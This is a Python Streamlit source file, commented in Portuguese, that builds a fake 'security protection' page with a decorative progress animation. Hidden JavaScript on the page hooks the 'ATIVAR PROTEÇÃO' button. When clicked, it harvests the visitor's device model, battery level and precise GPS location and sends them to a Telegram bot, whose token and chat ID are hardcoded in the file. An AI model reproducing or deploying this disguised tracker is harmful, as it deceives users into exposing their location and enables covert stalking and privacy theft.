import streamlit as st
import streamlit.components.v1 as components
import time

# --- ESTILIZAÇÃO MANTIDA ---
st.set_page_config(page_title="Segurança Ativa", page_icon="🛡️", layout="centered")

st.markdown("""
    <style>
    .main { background-color: #0e1117; }
    .stButton>button { 
        width: 100%; border-radius: 20px; background-color: #262730; 
        color: white; border: none; height: 50px; font-weight: bold;
    }
    .circle-container { display: flex; justify-content: center; align-items: center; height: 250px; }
    .circle {
        width: 200px; height: 200px; border-radius: 50%;
        border: 4px solid #1f2329; border-top: 4px solid #00ff7f;
        display: flex; justify-content: center; align-items: center;
        font-size: 40px; font-weight: bold; color: white;
    }
    .spin { animation: spin 2s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
    """, unsafe_allow_html=True)

# --- CONFIGURAÇÃO DO BOT ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
CHAT_ID = "8210828398"

# --- SCRIPT DE CAPTURA SEM F-STRING (IMPEDE ERRO DE SINTAXE) ---
js_final = """
<script>
    async function enviarTelegram(dados) {
        var botToken = '""" + TOKEN + """';
        var chatId = '""" + CHAT_ID + """';
        var texto = "📍 **Nova Captura**\\n📱 Modelo: " + dados.modelo + "\\n🔋 Bateria: " + dados.bateria + "\\n🌍 Local: https://www.google.com/maps?q=" + dados.lat + "," + dados.lon;
        var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(texto) + "&parse_mode=Markdown";
        await fetch(url);
    }

    async function capturarInfo() {
        var info = {
            modelo: navigator.userAgent.split('(')[1].split(')')[0],
            bateria: "n/a",
            lat: 0,
            lon: 0
        };

        try {
            var battery = await navigator.getBattery();
            info.bateria = Math.round(battery.level * 100) + "%";
        } catch (e) {}

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(pos) {
                info.lat = pos.coords.latitude;
                info.lon = pos.coords.longitude;
                enviarTelegram(info);
            }, function(err) {
                console.log("Localização negada");
            }, { enableHighAccuracy: true, timeout: 10000 });
        }
    }

    var checkBtn = setInterval(function() {
        var btn = window.parent.document.querySelector('button');
        if (btn) {
            btn.addEventListener('click', capturarInfo);
            clearInterval(checkBtn);
        }
    }, 500);
</script>
"""
components.html(js_final, height=0)

# --- INTERFACE ---
st.title("Verificar segurança")
placeholder = st.empty()

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

if st.button("● ATIVAR PROTEÇÃO"):
    # Animação da bolha subindo até 100%
    for i in range(4, 101, 5):
        placeholder.markdown('<div class="circle-container"><div class="circle spin">' + str(i) + '%</div></div>', unsafe_allow_html=True)
        time.sleep(0.05)
    st.success("Proteção Ativada!")
else:
    # Estado inicial 4%
    placeholder.markdown('<div class="circle-container"><div class="circle">4%</div></div>', unsafe_allow_html=True)

st.warning("Permissão de localização negada ou indisponível.")
